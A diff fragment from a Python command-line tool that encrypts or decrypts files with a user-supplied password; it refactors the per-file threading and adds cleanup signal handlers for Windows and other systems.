 		for i, file in enumerate(files):
-			files_count += 1
-
-			file_name, file_ext = os.path.splitext(file)
-			file_size = os.path.getsize(file)
-
-			if file_ext in [".exe", ".dll", ".vhd", ".vdi", ".iso", ".vbox", ".vhdx", ".sys"]:
-				files_exception_thrown += 1
-
-				files_errorlist.append(file_name + file_ext + " | Binary file")
-				files.remove(file)
-				continue
-			elif file_size > memory_max_allocated:
-				files_exception_thrown += 1
-
-				files_errorlist.append(file_name + file_ext + " | File too large")
-				files.remove(file)
-				continue
-
-		bar_total = files_count
-		for i, file in enumerate(files):
-			if cleanup_status:
+			if self.cleanup:
 				break
-
-			if cipher_method == "encrypt":
-				thread = thread_create(
-					callback = encrypt_file, 
-					input_file = file, 
-					password = password,
-					keep_copy = keep_copy
-				)
-			elif cipher_method == "decrypt":
-				thread = thread_create(
-					callback = decrypt_file, 
-					input_file = file, 
-					password = password,
-					keep_copy = keep_copy
-				)
-
-		while len(threads) > 0:
-			time.sleep(0.05)
-
-			if cleanup_status:
-				break
+			
+			def call_cipher(*args, **kwargs):
+				if cipher_method == "encrypt":
+					encrypt_file(*args, **kwargs)
+				else:
+					decrypt_file(*args, **kwargs)
+				
+			thread = self.thread_create(
+				callback = call_cipher,
+				
+				input_file = file,
+				password = password,
+				keep_copy = keep_copy,
+				
+				hash_pepper = self.hash_pepper,
+				password_pepper = self.password_pepper
+			)
+		
+		thread.join()
 
 		if verbose:
 			print(f"\n|-------------------------------------------------------------|\n\nTotal files : {files_count}")
@@ -1868,4 +1627,21 @@ class Main:
 		
 if __name__ == "__main__":
 	main = Main()
+	
+	def script_cleanup(signal=0, frame=None):
+		main.cleanup = True
+		cleanup_handler(signal=signal, frame=None, exit_reason="KeyboardInterrupt")
+	
+	if platform.system() == "Windows":
+		# kernel32 signal handler
+		kernel32 = ctypes.windll.kernel32
+		handler_type = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_ulong)
+
+		handler_func = handler_type(lambda signal: script_cleanup(signal))
+		kernel32.SetConsoleCtrlHandler(handler_func, True)
+
+		signal.signal(signal.SIGINT, lambda signal, frame: None)
+	else:
+		signal.signal(signal.SIGINT, lambda signal, frame: script_cleanup(signal, frame=frame))
+	
 	main.parse_args()
